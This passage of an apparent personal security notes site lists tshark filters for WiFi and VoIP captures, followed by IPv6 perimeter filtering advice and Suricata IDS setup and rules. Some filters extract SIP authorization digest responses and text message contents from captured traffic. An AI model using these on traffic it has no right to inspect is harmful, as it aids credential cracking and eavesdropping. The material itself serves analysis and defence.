<li>What is BSSID of SSID "LazyArtists": <code class="codehilite"><span class="n">tshark</span> <span class="o">-</span><span class="n">r</span> <span class="n">WiFi_traffic</span><span class="p">.</span><span class="n">pcap</span> <span class="o">-</span><span class="n">Y</span> <span class="ss">&quot;wlan.ssid==LazyArtists&quot;</span> <span class="o">-</span><span class="n">Tfields</span> <span class="o">-</span><span class="n">e</span> <span class="n">wlan</span><span class="p">.</span><span class="n">bssid</span></code></li>
<li>Channel of SSID "Home_Network": <code class="codehilite"><span class="n">tshark</span> <span class="o">-</span><span class="n">r</span> <span class="n">WiFi_traffic</span><span class="p">.</span><span class="n">pcap</span> <span class="o">-</span><span class="n">Y</span> <span class="ss">&quot;wlan.ssid==Home_Network&quot;</span> <span class="o">-</span><span class="n">Tfields</span> <span class="o">-</span><span class="n">e</span> <span class="n">wlan_radio</span><span class="p">.</span><span class="n">channel</span></code></li>
<li>Devices that received deauth messages: <code class="codehilite"><span class="n">tshark</span> <span class="o">-</span><span class="n">r</span> <span class="n">WiFi_traffic</span><span class="p">.</span><span class="n">pcap</span> <span class="o">-</span><span class="n">Y</span> <span class="ss">&quot;wlan.fc.type_subtype==0x000c&quot;</span> <span class="o">-</span><span class="n">Tfields</span> <span class="o">-</span><span class="n">e</span> <span class="n">wlan</span><span class="p">.</span><span class="n">ra</span></code></li>
<li>Which device does MAC 5c:51:88:31:a0:3b belongs to: <code class="codehilite"><span class="n">tshark</span> <span class="o">-</span><span class="n">r</span> <span class="n">WiFi_traffic</span><span class="p">.</span><span class="n">pcap</span> <span class="o">-</span><span class="n">Y</span> <span class="ss">&quot;wlan.ta==5c:51:88:31:a0:3b &amp;&amp; http&quot;</span> <span class="o">-</span><span class="n">Tfields</span> <span class="o">-</span><span class="n">e</span> <span class="n">http</span><span class="p">.</span><span class="n">user_agent</span></code></li>
<li>Beacon frames present: <code class="codehilite"><span class="n">tshark</span> <span class="o">-</span><span class="n">r</span> <span class="n">WiFi_traffic</span><span class="p">.</span><span class="n">pcap</span> <span class="o">-</span><span class="n">Y</span> <span class="s1">&#39;wlan.fc.type_subtype == 0x0008&#39;</span></code></li>
<li>Unique list of all AP BSSIDs: <code class="codehilite"><span class="n">tshark</span> <span class="o">-</span><span class="n">r</span> <span class="n">WiFi_traffic</span><span class="p">.</span><span class="n">pcap</span> <span class="o">-</span><span class="n">Y</span> <span class="s1">&#39;wlan.fc.type_subtype == 0x0008&#39;</span> <span class="o">-</span><span class="n">T</span> <span class="n">fields</span> <span class="o">-</span><span class="n">e</span> <span class="n">wlan</span><span class="p">.</span><span class="n">bssid</span> <span class="o">|</span> <span class="n">sort</span>  <span class="o">|</span> <span class="n">uniq</span></code></li>
<li>Unique list of all AP SSIDs: <code class="codehilite"><span class="n">tshark</span> <span class="o">-</span><span class="n">r</span> <span class="n">WiFi_traffic</span><span class="p">.</span><span class="n">pcap</span> <span class="o">-</span><span class="n">Y</span> <span class="s1">&#39;wlan.fc.type_subtype == 0x0008&#39;</span> <span class="o">-</span><span class="n">T</span> <span class="n">fields</span> <span class="o">-</span><span class="n">e</span> <span class="n">wlan</span><span class="p">.</span><span class="n">ssid</span> <span class="o">|</span> <span class="n">sort</span>  <span class="o">|</span> <span class="n">uniq</span></code></li>
<li>Only non-null SSIDs: <code class="codehilite"><span class="n">tshark</span> <span class="o">-</span><span class="n">r</span> <span class="n">WiFi_traffic</span><span class="p">.</span><span class="n">pcap</span> <span class="o">-</span><span class="n">Y</span> <span class="s1">&#39;wlan.fc.type_subtype == 0x0008 &amp;&amp; !(wlan.tag.length ==0)&#39;</span> <span class="o">-</span><span class="n">T</span> <span class="n">fields</span> <span class="o">-</span><span class="n">e</span> <span class="n">wlan</span><span class="p">.</span><span class="n">ssid</span> <span class="o">|</span> <span class="n">sort</span>  <span class="o">|</span> <span class="n">uniq</span></code></li>
<li>Unique list of SSID and BSSIDs side by side for all AP networks: <code class="codehilite"><span class="n">tshark</span> <span class="o">-</span><span class="n">r</span> <span class="n">WiFi_traffic</span><span class="p">.</span><span class="n">pcap</span> <span class="o">-</span><span class="n">Y</span> <span class="s1">&#39;wlan.fc.type_subtype == 0x0008&#39;</span> <span class="o">-</span><span class="n">T</span> <span class="n">fields</span> <span class="o">-</span><span class="n">e</span> <span class="n">wlan</span><span class="p">.</span><span class="n">ssid</span> <span class="o">-</span><span class="n">e</span> <span class="n">wlan</span><span class="p">.</span><span class="n">bssid</span> <span class="o">|</span> <span class="n">sort</span>  <span class="o">|</span> <span class="n">uniq</span></code></li>
</ul>
</li>
<li>VoIP<ul>
<li>Show VoIP traffic: <code class="codehilite"><span class="n">tshark</span> <span class="o">-</span><span class="n">r</span> <span class="n">VoIP_traffic</span><span class="p">.</span><span class="n">pcap</span> <span class="o">-</span><span class="n">Y</span> <span class="ss">&quot;sip or rtp&quot;</span></code></li>
<li>Print all REGISTER packets: <code class="codehilite"><span class="n">tshark</span> <span class="o">-</span><span class="n">r</span> <span class="n">VoIP_traffic</span><span class="p">.</span><span class="n">pcap</span> <span class="o">-</span><span class="n">Y</span> <span class="ss">&quot;sip.Method==REGISTER&quot;</span></code></li>
<li>Only print the source IP, sender extension and authorization digest response for REGISTER packets: <code class="codehilite"><span class="n">tshark</span> <span class="o">-</span><span class="n">r</span> <span class="n">VoIP_traffic</span><span class="p">.</span><span class="n">pcap</span> <span class="o">-</span><span class="n">Y</span> <span class="ss">&quot;sip.Method==REGISTER&quot;</span> <span class="o">-</span><span class="n">Tfields</span> <span class="o">-</span><span class="n">e</span> <span class="n">ip</span><span class="p">.</span><span class="n">src</span> <span class="o">-</span><span class="n">e</span> <span class="n">sip</span><span class="p">.</span><span class="k">from</span><span class="p">.</span><span class="k">user</span> <span class="o">-</span><span class="n">e</span> <span class="n">sip</span><span class="p">.</span><span class="n">auth</span><span class="p">.</span><span class="n">digest</span><span class="p">.</span><span class="n">response</span></code></li>
<li>Print all codecs being used by RTP protocol: <code class="codehilite"><span class="n">tshark</span> <span class="o">-</span><span class="n">r</span> <span class="n">VoIP_traffic</span><span class="p">.</span><span class="n">pcap</span> <span class="o">-</span><span class="n">Y</span> <span class="ss">&quot;sdp&quot;</span> <span class="o">-</span><span class="n">Tfields</span> <span class="o">-</span><span class="n">e</span> <span class="n">sdp</span><span class="p">.</span><span class="n">media</span></code></li>
<li>User who is using the Zoiper VoIP client: <code class="codehilite"><span class="n">tshark</span> <span class="o">-</span><span class="n">r</span> <span class="n">VoIP_traffic</span><span class="p">.</span><span class="n">pcap</span> <span class="o">-</span><span class="n">Y</span> <span class="ss">&quot;sip contains Zoiper&quot;</span> <span class="o">-</span><span class="n">Tfields</span> <span class="o">-</span><span class="n">e</span> <span class="n">ip</span><span class="p">.</span><span class="n">src</span></code></li>
<li>IP address of the SIP server used to place calls: <code class="codehilite"><span class="n">tshark</span> <span class="o">-</span><span class="n">r</span> <span class="n">VoIP_traffic</span><span class="p">.</span><span class="n">pcap</span> <span class="o">-</span><span class="n">Y</span> <span class="ss">&quot;sip.Method==REGISTER&quot;</span> <span class="o">-</span><span class="n">Tfields</span> <span class="o">-</span><span class="n">e</span> <span class="n">ip</span><span class="p">.</span><span class="n">dst</span></code></li>
<li>Content of the text message sent to +918108591527?: <code class="codehilite"><span class="n">tshark</span> <span class="o">-</span><span class="n">r</span> <span class="n">VoIP_traffic</span><span class="p">.</span><span class="n">pcap</span> <span class="o">-</span><span class="n">Y</span> <span class="ss">&quot;sip.Method == MESSAGE&quot;</span> <span class="o">-</span><span class="n">V</span>             <span class="p">(</span><span class="k">Read</span> <span class="n">the</span> <span class="n">content</span><span class="p">)</span></code></li>
<li>Extensions completed a call successfully: <code class="codehilite"><span class="n">tshark</span> <span class="o">-</span><span class="n">r</span> <span class="n">VoIP_traffic</span><span class="p">.</span><span class="n">pcap</span> <span class="o">-</span><span class="n">Y</span> <span class="ss">&quot;sip.Method==BYE&quot;</span> <span class="o">-</span><span class="n">Tfields</span> <span class="o">-</span><span class="n">e</span> <span class="n">sip</span><span class="p">.</span><span class="k">from</span><span class="p">.</span><span class="k">user</span> <span class="o">-</span><span class="n">e</span> <span class="n">sip</span><span class="p">.</span><span class="k">to</span><span class="p">.</span><span class="k">user</span></code></li>
</ul>
</li>
</ul>
<h2 id="defense">Defense<a class="headerlink" href="#defense" title="Permanent link">&para;</a></h2>
<ul>
<li>Phishing Blacklist: <a href="https://www.phishing.army/">https://www.phishing.army/</a></li>
<li>Open Source Security (OSSEC) is a free, open-source, host-based intrusion detection system (HIDS)<ul>
<li>log analysis portion of OSSEC as a log-based intrusion detection system (LIDS)</li>
<li>OSSEC is a virtual appliance based on CentOS and includes Elastic search-Logstash-Kibana (ELK)</li>
<li>Atomic rules are based on a single event occurring, while a composite rule is based on patterns across multiple logs.</li>
</ul>
</li>
<li>Hamachi by LogMeIn is a cloud-based, professional-level application that allows you to easily create a virtual private network (VPN) </li>
</ul>
<h3 id="ipv6">IPV6<a class="headerlink" href="#ipv6" title="Permanent link">&para;</a></h3>
<ul>
<li>Disallow traffic from unallocated IP address spaces</li>
<li>Implement Anti-Spoofing perimeter ACL:<ul>
<li>No packet with a source address of your network allocation can ENTER your network.</li>
<li>No packet with a destination address of your network allocation can LEAVE your network.</li>
</ul>
</li>
<li>Two categories of traffic<ul>
<li>Traffic initiated from perimeter security device</li>
<li>Traffic that is in-transit across perimeter</li>
</ul>
</li>
<li>Transit Traffic<ul>
<li>Transit Traffic Category Recommendations<ul>
<li>Start with a DENY ALL approach, and then allow selectively. Ensures that all unassigned/experimental types are DROPPED.</li>
<li>Allow Type 1: Destination Unreachable. Filter selectively allowing only specific codes such as code 4 - port unreachable.</li>
<li>Allow Type 2: Packet too large. (Do not break path MTU discovery)</li>
<li>Allow Type 3, Code 0 only. (TTL/Hop limit expired)</li>
<li>Allow Type 4, Codes 0 and 1 only related to header errors.</li>
</ul>
</li>
<li>Transit traffic filtering continued…<ul>
<li>Optionally allow ICMP types 128/129 (echo request/reply) based on local ICMP security policy.</li>
<li>Allow ICMP types 144 through 147 ONLY if your IPv6 network is “mobility enabled”. Many may choose to leave this in default drop state.</li>
<li>Optionally allow ICMP Multicast related messages (types 151 - 153). <ul>
<li>ONLY applicable if you participate in global multicast sourcing.</li>
</ul>
</li>
</ul>
</li>
<li>ICMP type 137 (Redirect) represents a direct security threat and should always be dropped at the perimeter.</li>
</ul>
</li>
<li>Non-transit <ul>
<li>Traffic initiated from perimeter security devices</li>
<li>Again start with a DENY ALL policy</li>
<li>Use the same recommendations as transit above with the exception of the mobility enabled class</li>
<li>Additional messages to ALLOW should be:<ul>
<li>Types 133/134: Router solicitation / advertisement</li>
<li>Types 135/136: Neighbor solicitation / advertisement</li>
<li>Types 141/142: Inverse neighbor solicitation / advertisement</li>
</ul>
</li>
</ul>
</li>
<li>Multicast Filtering<ul>
<li>Likely assumption for most is to not participate in global/inter-domain multicast<ul>
<li>Any packet with a multicast source address should be dropped</li>
<li>Reserved and unused multicast destinations should be dropped.</li>
<li>Probably most other multicast destinations will be blocked in a perimeter context.<ul>
<li>You don’t want any site or organization local traffic crossing the perimeter</li>
<li>Realm-local scoped traffic will be confined to specific technologies.</li>
<li>The decision to drop realm-local will have to be policy based.</li>
</ul>
</li>
<li>Global multicast should be dropped if not participating inter-domain.</li>
</ul>
</li>
</ul>
</li>
<li>Protocol Normalization<ul>
<li>IPv6 has a protocol header field labeled “Next Header”.</li>
<li>Normal OSI Layer 4 headers are called an “Upper Layer Header”</li>
<li>There can be chained “Extension Headers” in the frame before UL Header.</li>
</ul>
</li>
</ul>
<h3 id="idsips-suricata">IDS/IPS - Suricata<a class="headerlink" href="#idsips-suricata" title="Permanent link">&para;</a></h3>
<ul>
<li>Installation:
    <div class="codehilite"><pre><span></span><span class="n">sudo</span> <span class="k">add</span><span class="o">-</span><span class="n">apt</span><span class="o">-</span><span class="n">repository</span> <span class="n">ppa</span><span class="p">:</span><span class="n">oisf</span><span class="o">/</span><span class="n">suricata</span><span class="o">-</span><span class="k">stable</span> 
<span class="n">sudo</span> <span class="n">apt</span><span class="o">-</span><span class="k">get</span> <span class="k">update</span>
<span class="n">sudo</span> <span class="n">apt</span><span class="o">-</span><span class="k">get</span> <span class="n">install</span> <span class="n">suricata</span>
</pre></div></li>
<li>Update: <code class="codehilite"><span class="n">suricata</span><span class="o">-</span><span class="k">update</span></code><ul>
<li>With cron: <code class="codehilite"><span class="mi">0</span> <span class="mi">0</span> <span class="o">*</span> <span class="o">*</span> <span class="o">*</span> <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">suricata</span><span class="o">-</span><span class="k">update</span> <span class="o">&amp;&amp;</span> <span class="n">kill</span> <span class="o">-</span><span class="n">USR2</span> <span class="err">$</span><span class="p">(</span><span class="n">pidof</span> <span class="n">suricata</span><span class="p">)</span> <span class="o">&gt;</span> <span class="o">/</span><span class="n">dev</span><span class="o">/</span><span class="k">null</span> <span class="mi">2</span><span class="o">&gt;&amp;</span><span class="mi">1</span></code>
  <div class="codehilite"><pre><span></span><span class="n">suricata</span><span class="o">-</span><span class="k">update</span> <span class="k">update</span><span class="o">-</span><span class="n">sources</span>
<span class="n">suricata</span><span class="o">-</span><span class="k">update</span> <span class="n">list</span><span class="o">-</span><span class="n">sources</span>
<span class="n">suricata</span><span class="o">-</span><span class="k">update</span> <span class="n">enable</span><span class="o">-</span><span class="k">source</span> <span class="o">&lt;</span><span class="n">name</span><span class="o">&gt;</span>
<span class="n">suricata</span><span class="o">-</span><span class="k">update</span> <span class="k">add</span><span class="o">-</span><span class="k">source</span> <span class="o">&lt;</span><span class="n">name</span><span class="o">&gt;</span> <span class="o">&lt;</span><span class="n">url</span><span class="o">&gt;</span>
<span class="n">suricata</span><span class="o">-</span><span class="k">update</span> <span class="n">remove</span><span class="o">-</span><span class="k">source</span> <span class="o">&lt;</span><span class="n">name</span><span class="o">&gt;</span>
<span class="n">suricata</span><span class="o">-</span><span class="k">update</span> <span class="n">list</span><span class="o">-</span><span class="n">enabled</span><span class="o">-</span><span class="n">sources</span>
</pre></div></li>
</ul>
</li>
<li>Reload: <code class="codehilite"><span class="n">kill</span> <span class="o">-</span><span class="n">USR2</span> <span class="err">$</span><span class="p">(</span><span class="n">pidof</span> <span class="n">suricata</span><span class="p">)</span></code></li>
<li>Config: <code class="codehilite"><span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">suricata</span><span class="o">/</span><span class="n">suricata</span><span class="p">.</span><span class="n">yaml</span></code><ul>
<li><code class="codehilite"><span class="n">HOME_NET</span></code> – Internal network which is to be protected</li>
<li><code class="codehilite"><span class="n">EXTERNAL_NET</span></code> – External network;</li>
<li><code class="codehilite"><span class="n">af</span><span class="o">-</span><span class="n">packet</span> <span class="n">interface</span></code> – Network interface which Suricata should use for monitoring.</li>
</ul>
</li>
<li>Logs: <code class="codehilite"><span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">log</span><span class="o">/</span><span class="n">suricata</span></code><ul>
<li><code class="codehilite"><span class="n">eve</span><span class="p">.</span><span class="n">json</span></code>: Network events and alerts in Extensible Event Format</li>
<li><code class="codehilite"><span class="n">suricata</span><span class="p">.</span><span class="n">log</span></code>: Service messages </li>
<li><code class="codehilite"><span class="n">fast</span><span class="p">.</span><span class="n">log</span></code>: Network events and alerts in single line formatted.</li>
</ul>
</li>
<li>Rules: <code class="codehilite"><span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">suricata</span><span class="o">/</span><span class="n">rules</span></code> (OOTB rules are at <code class="codehilite"><span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">suricata</span><span class="o">/</span><span class="n">rules</span></code>)<ul>
<li>Referenced from config file at <code class="codehilite"><span class="k">rule</span><span class="o">-</span><span class="n">files</span> <span class="n">section</span></code>.</li>
</ul>
</li>
<li>Rule Types:<ul>
<li><code class="codehilite"><span class="n">Pass</span></code> – let the packet through without generating an alert</li>
<li><code class="codehilite"><span class="k">Drop</span></code> – if matched, drop and logd</li>
<li><code class="codehilite"><span class="n">Reject</span></code> – similarly <code class="codehilite"><span class="k">drop</span></code>, and both the sender and receiver will receive a reject packet</li>
<li><code class="codehilite"><span class="n">Alert</span></code> – the packet is allowed through but an alert will be generated</li>
</ul>
</li>
<li>Supported porotocals: <a href="https://suricata.readthedocs.io/en/suricata-4.1.4/rules/intro.html#protocol">https://suricata.readthedocs.io/en/suricata-4.1.4/rules/intro.html#protocol</a></li>
<li>Rule format:<ul>
<li><code class="codehilite"><span class="ss">&quot;Source IP&quot;</span> <span class="ss">&quot;Source port&quot;</span> <span class="o">-&gt;</span> <span class="ss">&quot;Destination IP&quot;</span> <span class="ss">&quot;Destination port&quot;</span></code></li>
<li><code class="codehilite"><span class="ss">&quot;Source IP&quot;</span> <span class="ss">&quot;Source port&quot;</span> <span class="o">&lt;&gt;</span> <span class="ss">&quot;Destination IP&quot;</span> <span class="ss">&quot;Destination port&quot;</span></code></li>
<li>Example: <code class="codehilite"><span class="err">$</span><span class="n">EXTERNAL_NET</span> <span class="k">any</span> <span class="o">-&gt;</span> <span class="err">$</span><span class="n">HOME_NET</span> <span class="mi">22</span></code></li>
</ul>
</li>
<li>Options:<ul>
<li><code class="codehilite"><span class="n">msg</span></code> – information</li>
<li><code class="codehilite"><span class="n">sid</span></code> – unique ID number of the rule</li>
<li><code class="codehilite"><span class="n">rev</span></code> – version of the rule (incremented by 1 when the rule is updated)</li>
<li><code class="codehilite"><span class="o">(</span><span class="nt">msg</span><span class="o">:</span><span class="s2">&quot;Suspicious connection @ 1111&quot;</span><span class="o">;</span> <span class="nt">sid</span><span class="p">:</span><span class="nd">1111</span><span class="o">;</span> <span class="nt">rev</span><span class="p">:</span><span class="nd">1</span><span class="o">;)</span></code></li>
</ul>
</li>
<li>Example Rule:
    <div class="codehilite"><pre><span></span><span class="nt">alert</span> <span class="nt">tcp</span> <span class="o">$</span><span class="nt">EXTERNAL_NET</span> <span class="nt">any</span> <span class="nt">-</span><span class="o">&gt;</span> <span class="o">$</span><span class="nt">HOME_NET</span> <span class="nt">3306</span> <span class="o">(</span><span class="nt">msg</span><span class="o">:</span><span class="s2">&quot;ET SCAN Suspicious inbound to mySQL port 3306&quot;</span><span class="o">;</span> <span class="nt">flow</span><span class="p">:</span><span class="nd">to_server</span><span class="o">;</span> <span class="nt">flags</span><span class="p">:</span><span class="nd">S</span><span class="o">;</span> <span class="nt">threshold</span><span class="o">:</span> <span class="nt">type</span> <span class="nt">limit</span><span class="o">,</span> <span class="nt">count</span> <span class="nt">5</span><span class="o">,</span> <span class="nt">seconds</span> <span class="nt">60</span><span class="o">,</span> <span class="nt">track</span> <span class="nt">by_src</span><span class="o">;</span> <span class="nt">metadata</span><span class="o">:</span> <span class="nt">former_category</span> <span class="nt">POLICY</span><span class="o">;</span> <span class="nt">reference</span><span class="p">:</span><span class="nd">url</span><span class="o">,</span><span class="nt">doc</span><span class="p">.</span><span class="nc">emergingthreats</span><span class="p">.</span><span class="nc">net</span><span class="o">/</span><span class="nt">2010937</span><span class="o">;</span> <span class="nt">classtype</span><span class="p">:</span><span class="nd">bad-unknown</span><span class="o">;</span> <span class="nt">sid</span><span class="p">:</span><span class="nd">2010937</span><span class="o">;</span> <span class="nt">rev</span><span class="p">:</span><span class="nd">3</span><span class="o">;</span> <span class="nt">metadata</span><span class="p">:</span><span class="nd">created_at</span> <span class="nt">2010_07_30</span><span class="o">,</span> <span class="nt">updated_at</span> <span class="nt">2018_03_27</span><span class="o">;)</span> 
<span class="nt">drop</span> <span class="nt">tcp</span> <span class="nt">any</span> <span class="nt">any</span> <span class="nt">-</span><span class="o">&gt;</span> <span class="nt">10</span><span class="p">.</span><span class="nc">33</span><span class="p">.</span><span class="nc">33</span><span class="p">.</span><span class="nc">1</span> <span class="nt">any</span> <span class="o">(</span><span class="nt">msg</span><span class="o">:</span> <span class="s2">&quot;TCP packet to malicious host, Drop&quot;</span><span class="o">;</span> <span class="nt">sid</span><span class="p">:</span><span class="nd">10001</span><span class="o">;)</span>
<span class="nt">drop</span> <span class="nt">tcp</span> <span class="nt">10</span><span class="p">.</span><span class="nc">33</span><span class="p">.</span><span class="nc">33</span><span class="p">.</span><span class="nc">1</span> <span class="nt">any</span> <span class="nt">-</span><span class="o">&gt;</span> <span class="nt">any</span> <span class="nt">any</span> <span class="o">(</span><span class="nt">msg</span><span class="o">:</span> <span class="s2">&quot;TCP packet from malicious host, Drop&quot;</span><span class="o">;</span> <span class="nt">sid</span><span class="p">:</span><span class="nd">10002</span><span class="o">;)</span>
<span class="nt">drop</span> <span class="nt">udp</span> <span class="nt">any</span> <span class="nt">any</span> <span class="nt">-</span><span class="o">&gt;</span> <span class="nt">10</span><span class="p">.</span><span class="nc">33</span><span class="p">.</span><span class="nc">33</span><span class="p">.</span><span class="nc">1</span> <span class="nt">any</span> <span class="o">(</span><span class="nt">msg</span><span class="o">:</span> <span class="s2">&quot;UDP packet to malicious host, Drop&quot;</span><span class="o">;</span> <span class="nt">sid</span><span class="p">:</span><span class="nd">10003</span><span class="o">;)</span>
<span class="nt">drop</span> <span class="nt">udp</span> <span class="nt">10</span><span class="p">.</span><span class="nc">33</span><span class="p">.</span><span class="nc">33</span><span class="p">.</span><span class="nc">1</span> <span class="nt">any</span> <span class="nt">-</span><span class="o">&gt;</span> <span class="nt">any</span> <span class="nt">any</span> <span class="o">(</span><span class="nt">msg</span><span class="o">:</span> <span class="s2">&quot;UDP packet from malicious host, Drop&quot;</span><span class="o">;</span> <span class="nt">sid</span><span class="p">:</span><span class="nd">10004</span><span class="o">;)</span>
</pre></div></li>
<li><code class="codehilite"><span class="n">NFQUEUE</span></code>: iptables and ip6tables target which delegates the decision on packets to a userspace software. <ul>
<li>When sudicata is installed in gateway:
  <div class="codehilite"><pre><span></span><span class="n">sudo</span> <span class="n">iptables</span> <span class="o">-</span><span class="n">I</span> <span class="k">FORWARD</span> <span class="o">-</span><span class="n">j</span> <span class="n">NFQUEUE</span>
</pre></div></li>
<li>When installed on the host that should be protected:
  <div class="codehilite"><pre><span></span><span class="n">sudo</span> <span class="n">iptables</span> <span class="o">-</span><span class="n">I</span> <span class="k">INPUT</span> <span class="o">-</span><span class="n">j</span> <span class="n">NFQUEUE</span>
<span class="n">sudo</span> <span class="n">iptables</span> <span class="o">-</span><span class="n">I</span> <span class="k">OUTPUT</span> <span class="o">-</span><span class="n">j</span> <span class="n">NFQUEUE</span>
</pre></div></li>
<li>Example:
  <div class="codehilite"><pre><span></span><span class="n">iptables</span> <span class="o">-</span><span class="n">t</span> <span class="n">mangle</span> <span class="o">-</span><span class="n">I</span> <span class="n">PREROUTING</span> <span class="o">-</span><span class="n">p</span> <span class="n">tcp</span> <span class="o">-</span><span class="n">m</span> <span class="n">tcp</span> <span class="c1">--dport 80 -j NFQUEUE --queue-num 0</span>
<span class="n">iptables</span> <span class="o">-</span><span class="n">t</span> <span class="n">mangle</span> <span class="o">-</span><span class="n">I</span> <span class="n">PREROUTING</span> <span class="o">-</span><span class="n">p</span> <span class="n">tcp</span> <span class="o">-</span><span class="n">m</span> <span class="n">tcp</span> <span class="c1">--sport 80 -j NFQUEUE --queue-num 0</span>
<span class="n">iptables</span> <span class="o">-</span><span class="n">t</span> <span class="n">mangle</span> <span class="o">-</span><span class="n">I</span> <span class="n">PREROUTING</span> <span class="o">-</span><span class="n">p</span> <span class="n">udp</span> <span class="o">-</span><span class="n">m</span> <span class="n">udp</span> <span class="c1">--dport 53 -j NFQUEUE --queue-num 0</span>
<span class="n">iptables</span> <span class="o">-</span><span class="n">t</span> <span class="n">mangle</span> <span class="o">-</span><span class="n">I</span> <span class="n">PREROUTING</span> <span class="o">-</span><span class="n">p</span> <span class="n">udp</span> <span class="o">-</span><span class="n">m</span> <span class="n">udp</span> <span class="c1">--sport 53 -j NFQUEUE --queue-num 0</span>
</pre></div></li>
</ul>
</li>
<li>Modes:
    <div class="codehilite"><pre><span></span><span class="n">nfq</span><span class="o">:</span>
<span class="n">mode</span><span class="o">:</span> <span class="n">accept</span><span class="sr">/repeat/</span><span class="n">route</span>
<span class="n">repeat_mark</span><span class="o">:</span> <span class="mi">1</span>             <span class="err">#</span> <span class="n">repeat</span> <span class="n">mode</span> <span class="n">option</span>
<span class="n">repeat_mask</span><span class="o">:</span> <span class="mi">1</span>             <span class="err">#</span> <span class="n">repeat</span> <span class="n">mode</span> <span class="n">option</span>
<span class="n">route_queue</span><span class="o">:</span> <span class="mi">2</span>             <span class="err">#</span> <span class="n">route</span> <span class="n">mode</span> <span class="n">option</span>
</pre></div><ul>
<li><code class="codehilite"><span class="n">accept</span></code>: the packet will not be inspected by the rest of the iptables rules </li>
<li><code class="codehilite"><span class="n">repeat</span></code>: the packets will be marked by Suricata and re-injected to the first rule of iptables. Looping is avoided by:<ul>
<li><code class="codehilite"><span class="n">iptables</span> <span class="o">-</span><span class="n">I</span> <span class="k">FORWARD</span> <span class="o">-</span><span class="n">m</span> <span class="n">mark</span> <span class="o">!</span> <span class="c1">--mark $MARK/$MASK -j NFQUEUE</span></code></li>
</ul>
</li>
<li><code class="codehilite"><span class="n">route</span></code>: make sure the packet will be sent to another tool after being processed by Suricata</li>
</ul>
</li>
<li>Reload rules: <code class="codehilite"><span class="n">suricatasc</span> <span class="o">-</span><span class="k">c</span> <span class="n">reload</span><span class="o">-</span><span class="n">rules</span></code></li>
</ul>
<h2 id="references">References<a class="headerlink" href="#references" title="Permanent link">&para;</a></h2>
<ul>
<li><a href="https://www.hackingarticles.in/beginners-guide-to-impacket-tool-kit-part-1/">Beginner's Guide to Impacket Tool kit (Part 1)</a></li>
<li>Let's code a TCP/IP stack, 1: Ethernet &amp; ARP: <a href="http://www.saminiir.com/lets-code-tcp-ip-stack-1-ethernet-arp/">http://www.saminiir.com/lets-code-tcp-ip-stack-1-ethernet-arp/</a></li>
<li>Let's code a TCP/IP stack, 2: IPv4 &amp; ICMPv4: <a href="http://www.saminiir.com/lets-code-tcp-ip-stack-2-ipv4-icmpv4/">http://www.saminiir.com/lets-code-tcp-ip-stack-2-ipv4-icmpv4/</a></li>
<li>Let's code a TCP/IP stack, 3: TCP Basics &amp; Handshake: <a href="http://www.saminiir.com/lets-code-tcp-ip-stack-3-tcp-handshake/">http://www.saminiir.com/lets-code-tcp-ip-stack-3-tcp-handshake/</a></li>
<li>Practical man-in-the-middle attacks in computer networks - Matˇej Plch: <a href="https://is.muni.cz/th/s8uf2/thesis.pdf">https://is.muni.cz/th/s8uf2/thesis.pdf</a></li>
</ul>
                
                  
                
                
              
              
                


              
            </article>
          </div>
        </div>
      </main>
      
        
<footer class="md-footer">
  
    <div class="md-footer-nav">
      <nav class="md-footer-nav__inner md-grid">
        
          <a href="../malware/" title="Malware" class="md-flex md-footer-nav__link md-footer-nav__link--prev" rel="prev">
            <div class="md-flex__cell md-flex__cell--shrink">
              <i class="md-icon md-icon--arrow-back md-footer-nav__button"></i>
            </div>
            <div class="md-flex__cell md-flex__cell--stretch md-footer-nav__title">
              <span class="md-flex__ellipsis">
                <span class="md-footer-nav__direction">
                  Previous
                </span>
                Malware
              </span>
            </div>
          </a>
        
        
          <a href="../non-security/" title="Z Non Security" class="md-flex md-footer-nav__link md-footer-nav__link--next" rel="next">
            <div class="md-flex__cell md-flex__cell--stretch md-footer-nav__title">
              <span class="md-flex__ellipsis">
                <span class="md-footer-nav__direction">
                  Next
                </span>
                Z Non Security
              </span>
            </div>
            <div class="md-flex__cell md-flex__cell--shrink">
              <i class="md-icon md-icon--arrow-forward md-footer-nav__button"></i>
            </div>
          </a>
        
      </nav>
    </div>
  
  <div class="md-footer-meta md-typeset">
    <div class="md-footer-meta__inner md-grid">
      <div class="md-footer-copyright">
        
        powered by
        <a href="https://www.mkdocs.org">MkDocs</a>
        and
        <a href="https://squidfunk.github.io/mkdocs-material/">
          Material for MkDocs</a>
      </div>
      
    </div>
  </div>
</footer>
      
    </div>
    
      <script src="../assets/javascripts/application.808e90bb.js"></script>
      
      <script>app.initialize({version:"1.0.4",url:{base:".."}})</script>
      
    
  </body>
</html>